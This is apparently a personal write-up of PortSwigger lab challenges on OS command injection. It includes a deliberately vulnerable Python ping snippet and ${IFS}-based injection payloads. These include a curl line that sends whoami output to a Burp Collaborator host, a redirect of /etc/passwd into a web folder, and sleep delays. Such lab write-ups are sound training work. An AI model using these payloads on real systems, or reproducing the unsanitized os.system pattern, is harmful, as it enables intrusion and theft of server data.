### Command injection(Portswigger labs)

### Command Injection vulnerability in web apps 
   
   Command injection occurs when an attacker is able to execute shell commands(operating system commands) on a server.This vulnerability can compromise sensitive data and also help to grant access too an infrastructure.Below is an example of a vulnerable code snippet
   A website can decide to use the Linux ping utility to allow website visitors to ping ip addresses e.g
        
        import os

        ipaddr = input('Enter your ip address')
        result = os.system(f"ping {ipaddr}")
        print(result)
  
  If the user input is not properly sanitized,an attacker can close the first statement with a semi-colon(if linux) and execute another statement.
      
      ┌──(senzsei㉿kali)-[~]
      └─$ ./try.py
      Enter your ip address:;echo 'sleep'
      ping: usage error: Destination address required
      sleep
      0

  
### Challenge 1: Os command injection simple case
Challenge description:

  ![2023-10-22_16-05](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1a21ffc3-3e04-46d1-bb0c-682749281f3d)

- I intercepted the check stock feature with burp proxy 

  ![2023-10-22_16-16](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbd5496c-ea1a-43d8-b108-6201643e3351)

- I tested both fields with linux shell command but It did not return any output.So I used semi-colon before the commands and it worked.
     
  ![2023-10-22_16-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cd3e5497-c800-480d-bab8-e5bafd9bd7a3)

- Challenge solved

  ![2023-10-22_16-17](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a4035f0-62b1-41f2-b186-c1dfb8ce43c8)

### Challenge 2:
Challenge 2 description: Blind command injection with out of band exfiltration

  ![2023-10-24_14-12](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbec0d6a-ba94-4377-a8fc-f7bed033e85f)

- The main goal of this challenge is to exploit blind command injection by exfiltrating command output with the aid of burp collaborator.I intercepted the feedback form with burp proxy.

  ![2023-10-24_14-31](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/37093ea4-afa0-499e-afcc-f75610fc3d23)

- After sending to the repeater,I decided to test if the linux utilities that I need are filtered or if some commands are filtered.The first thing I did was making a request to burp collaborator with curl and I noticed that the string 'curl' was not filtered by the website.
- I used this payload to send a request to burp collaborator with a message saying "sleep".Note that ${IFS} means space in bash

      ;curl${IFS}<burp collaborator's link>${IFS}-d${IFS}'sleep'
- The server made a request to burp collaborator containing "sleep" in the body.

   ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3df3fac5-8e45-4b4e-8e2c-e2db12d8dbd0)

- I exfiltrated the current user account with this payload.The payload pipes the result of 'whoami' to the position of @- and curl makes a request containing the data to burp collabortor.

      ;whoami${IFS}|curl${IFS}<burp collaborator's link>${IFS}-d${IFS}@-${IFS}2>/dev/null
- Burp collaborator received a request containing the current user account.

  ![2023-10-24_14-49](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ebbce3fd-b83d-47fd-be84-294500b5aa60)

- Challenge solved

  ![2023-10-24_15-08](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d3bf9ad4-7537-4243-aa13-66e7b422dcaa)
  
### Challenge 3:

Challenge description: Blind OS command injection with out-of-band interaction
  
  ![2023-10-24_15-16](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/eeb9ee81-696e-46df-9cee-ee8cc9fac515)

- I used the payload of the last challenge to make a dns query to burp collaborator

  ![2023-10-24_15-37](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/fbda2acf-bb9e-4035-8e0e-7bc4e7dfdd52)

- Challenge solved

  ![2023-10-24_15-40](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0f401a1f-33f2-4bc8-993c-5bd005c84b03)

### Challenge 4

Challenge description: Blind OS command injection with output redirection

  ![2023-10-24_15-54](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ceedb1e0-ac2c-4910-8c84-b937bfa72b04)

- The main goal of the challeenge is to redirect uur output to the writable folder "/var/www/images"
- Intercept the feedback request and forward to the repeater

  ![2023-10-24_16-51](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c0a43bfb-3541-4357-a4c3-a6e68249df21)

- Use this linux command to redirect whoami output to a file in /var/www/images

        ;touch${IFS}/var/www/images/resullt.txt;whoami${IFS}>${IFS}/var/www/images/result.txt
        ;cat${IFS}/etc/passwd>/var/www/images/result.txt

  ![2023-10-24_16-57](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a0a1c81c-e08b-49cb-98cb-516778b9b206)

- I noticed a particular link is vulnerable to Local File Include and be used to read local files

      https://0a880060030a479a803ac6e800e000e5.web-security-academy.net/image?filename=result.txt

- I redirected the output of /etc/passwd to result.txt and I got this output after visiting the link

  ![2023-10-24_17-17](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a3e4891c-aaf4-4c1d-8404-a36ac3aeb30a)

- I noticed that I could not redirect the output of 'whoami' but I was able to redirect the contents of /etc/passwd.Challenge solved

  ![2023-10-24_17-29](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a8ab9448-fbcb-4f90-99da-3ccfd8ad231d)

        
### Last Challenge
Challenge Description: Blind OS command injection with time delays

 ![2023-10-24_17-38](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7a38ed0f-12b1-4489-a7c8-72b419c31662)

- The goal of this challenge is to initiate a 10 seconds time delay.You can achieve it with bash 'sleep' function

       sleep 10
- I used the payload to initiate multiple time delay

      ;sleep${IFS}20;sleep${IFS}10;sleep${IFS}10;sleep${IFS}10;sleep${IFS}10

   ![2023-10-24_17-50](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0449e534-5ff5-43f9-a63b-0972d8157c1c)

- Challenge solved

   ![2023-10-24_17-53](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/184d6931-a629-4d4d-aa58-51748d5ed3e7)

  

